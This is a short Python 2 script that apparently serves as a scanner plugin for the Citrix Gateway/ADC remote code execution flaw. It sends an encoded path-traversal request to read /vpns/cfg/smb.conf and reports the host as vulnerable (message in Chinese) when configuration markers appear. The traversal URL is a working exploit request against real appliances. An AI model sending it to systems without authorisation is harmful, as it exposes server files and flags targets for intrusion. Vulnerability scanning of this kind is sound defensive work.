# coding: utf8
import httplib2


def detect(target, port):
    url = "https://%s:%s/vpn/js/%%2e./.%%2e/%%76pns/cfg/smb.conf" % (target, port)
    http = httplib2.Http()
    res, content = http.request(url)

    if "[global]" in content and "encrypt passwords" in content and "name resolve order" in content:
        print target + ':' + port + u' 存在Citrix Gateway/ADC 远程代码执行漏洞'